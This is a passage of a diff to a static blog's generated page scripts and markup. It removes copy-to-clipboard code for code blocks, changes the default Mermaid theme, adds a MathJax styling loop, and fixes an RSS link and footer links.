+<svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="${32 - size}px" height="${32 - size}px"><path d="M 5.5625 0 C 4.136719 0 2.707031 0.542969 1.625 1.625 C -0.539063 3.789063 -0.539063 7.335938 1.625 9.5 L 5.28125 13.15625 C 5.667969 13.554688 6.304688 13.558594 6.703125 13.171875 C 7.101563 12.785156 7.105469 12.148438 6.71875 11.75 L 3.03125 8.0625 C 1.632813 6.664063 1.632813 4.429688 3.03125 3.03125 C 4.429688 1.632813 6.664063 1.632813 8.0625 3.03125 L 12.96875 7.9375 C 14.367188 9.335938 14.367188 11.570313 12.96875 12.96875 C 12.804688 13.132813 12.621094 13.25 12.4375 13.375 C 11.980469 13.6875 11.859375 14.308594 12.171875 14.765625 C 12.484375 15.222656 13.105469 15.34375 13.5625 15.03125 C 13.847656 14.835938 14.125 14.625 14.375 14.375 C 16.539063 12.210938 16.539063 8.664063 14.375 6.5 L 9.5 1.625 C 8.417969 0.542969 6.988281 0 5.5625 0 Z M 10.78125 8.875 C 10.738281 8.882813 10.695313 8.894531 10.65625 8.90625 C 10.507813 8.9375 10.371094 9 10.25 9.09375 C 10.039063 9.253906 9.820313 9.429688 9.625 9.625 C 7.460938 11.789063 7.460938 15.335938 9.625 17.5 L 14.5 22.375 C 16.664063 24.539063 20.210938 24.539063 22.375 22.375 C 24.539063 20.210938 24.539063 16.664063 22.375 14.5 L 18.71875 10.875 C 18.476563 10.578125 18.089844 10.441406 17.714844 10.527344 C 17.34375 10.613281 17.050781 10.90625 16.964844 11.277344 C 16.878906 11.652344 17.015625 12.039063 17.3125 12.28125 L 20.96875 15.9375 C 22.367188 17.335938 22.367188 19.570313 20.96875 20.96875 C 19.570313 22.367188 17.335938 22.367188 15.9375 20.96875 L 11.03125 16.0625 C 9.632813 14.664063 9.632813 12.429688 11.03125 11.03125 C 11.152344 10.90625 11.300781 10.820313 11.4375 10.71875 C 11.839844 10.472656 12.015625 9.976563 11.855469 9.53125 C 11.699219 9.085938 11.25 8.8125 10.78125 8.875 Z"/></svg>`;
 
       if (languagedir === "rtl") {
         newElemInner.style.left = '-2rem';
@@ -3433,132 +3758,8 @@ document.addEventListener('DOMContentLoaded', function () {
       e.trigger.classList.add('tooltipped');
       e.trigger.classList.add('tooltipped-s');
     });
-    
+    // =================================================================
 
-
-    
-    var clipInit = false;
-    var preChromaElem = document.querySelectorAll('pre.chroma');
-    var langCodeElem = document.querySelectorAll('.language-code');
-    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
-    var gtCodeElem = document.querySelectorAll('div.language-\\>');
-
-    var makeClipboard = function(elem) {
-      var code = elem,
-        text = elem.textContent;
-        
-      if (text.length > 15) {
-        if (!clipInit) {
-          var text, clip = new ClipboardJS('.copy-to-clipboard', {
-            text: function (trigger) {
-              var codeElem = prev(trigger).querySelectorAll('code');
-              if (codeElem.length > 1) {
-                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
-              } else {
-                text = prev(trigger).querySelector('code').textContent;
-              }
-
-              return text.replace(/^\$\s/gm, '');
-            }
-          });
-
-          var inPre;
-          clip.on('success', function (e) {
-            e.clearSelection();
-            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
-            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
-            e.trigger.classList.add('tooltipped');
-            e.trigger.classList.add('tooltipped-w');
-          });
-
-          clip.on('error', function (e) {
-            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
-            e.trigger.setAttribute('aria-label', e.action.toString());
-            e.trigger.classList.add('tooltipped');
-            e.trigger.classList.add('tooltipped-w');
-          });
-
-          clipInit = true;
-        }
-
-        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
-        var isNotAllowedIncluded = false;
-        var curClassName = code.getAttribute('class');
-
-        for (var i = 0; i < notAllowedClass.length; i++) {
-          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
-            isNotAllowedIncluded = true;
-            break;
-          }
-        }
-
-        if (!isNotAllowedIncluded) {
-          if (curClassName) {
-            var newClipboardElem = document.createElement('span');
-            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
-            newClipboardElem.setAttribute('title', 'Copy to clipboard');
-            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
-          }
-        }
-      }
-    }
-
-    var makeSymbolClipboard = function(elem) {
-      var clipboardSpan = document.createElement('span');
-      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
-      clipboardSpan.setAttribute('title', 'Copy to clipboard');
-      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
-    }
-
-    preChromaElem ? 
-    preChromaElem.forEach(function(elem) {
-      elem.querySelectorAll('code').forEach(function(codeElem) {
-        makeClipboard(codeElem);
-      });
-    }) : null;
-    
-    langCodeElem ? 
-    langCodeElem.forEach(function(elem) {
-      elem.querySelectorAll('code').forEach(function (codeElem) {
-        makeClipboard(codeElem);
-      });
-    }) : null;
-
-    dollarCodeElem ? 
-    dollarCodeElem.forEach(function(elem) {
-      elem.querySelectorAll('code').forEach(function (codeElem) {
-        makeSymbolClipboard(codeElem);
-      });
-    }) : null;
-
-    gtCodeElem ?
-    gtCodeElem.forEach(function(elem) {
-      elem.querySelectorAll('code').forEach(function (codeElem) {
-        makeSymbolClipboard(codeElem);
-      });
-    }) : null;
-    
-
-
-    
-    dollarCodeElem ?
-    dollarCodeElem.forEach(function(elem) {
-      var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
-      lnts ? 
-      lnts.forEach(function(lnt) {
-        lnt.innerHTML = '$<br/>';
-      }) : null;
-    }) : null;
-
-    gtCodeElem ?
-    gtCodeElem.forEach(function(elem) {
-      var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
-      lnts ? 
-      lnts.forEach(function(lnt) {
-        lnt.innerHTML = '><br/>';
-      }) : null;
-    }) : null;
-    
 
 
     
@@ -3567,7 +3768,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     if (lib && lib.includes('mermaid')) {
       
-      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"mytheme\"");
+      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");
 
       if (themeVariant === "dark" || themeVariant === "hacker") {
         mermaid.initialize({ theme: 'dark' });
@@ -3593,6 +3794,7 @@ document.addEventListener('DOMContentLoaded', function () {
       });
     }
     
+
     
 
     
@@ -3610,6 +3812,7 @@ document.addEventListener('DOMContentLoaded', function () {
       renderMathInElement(document.querySelector('.single__contents'), options);
     }
     
+
 
 
     
@@ -3637,9 +3840,14 @@ document.addEventListener('DOMContentLoaded', function () {
     }
     
 
+    
 
     
+    document.querySelectorAll("mjx-container").forEach(function (x) {
+      x.parentElement.classList += 'has-jax'
+    });
     
+
 
 
     
@@ -3663,6 +3871,7 @@ document.addEventListener('DOMContentLoaded', function () {
       });
     }
     
+
 
 
     
@@ -3706,6 +3915,7 @@ document.addEventListener('DOMContentLoaded', function () {
     
 
 
+
     
     if (lib && lib.includes('wavedrom')) {
       var wavePrefix = "language-wave";
@@ -3726,6 +3936,7 @@ document.addEventListener('DOMContentLoaded', function () {
       });
     }
     
+
 
 
     
@@ -3847,11 +4058,12 @@ document.addEventListener('DOMContentLoaded', function () {
   
   
     
-      <a href="https://Alignof.github.io/blog/posts//index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
+      <a href="https://Alignof.github.io/blog/posts/index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
         <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
       </a>
     
   
+
 
   </div>
 </div>
@@ -3865,11 +4077,11 @@ document.addEventListener('DOMContentLoaded', function () {
 
     <hr />
 
-    <div class="basicflex">
+    <div class="basicflex flexwrap">
         
-            <a href="" class="footer__link" target="_blank" rel="noreferrer"></a>
+            
         
-            <a href="" class="footer__link" target="_blank" rel="noreferrer"></a>
+            
         
     </div>
 
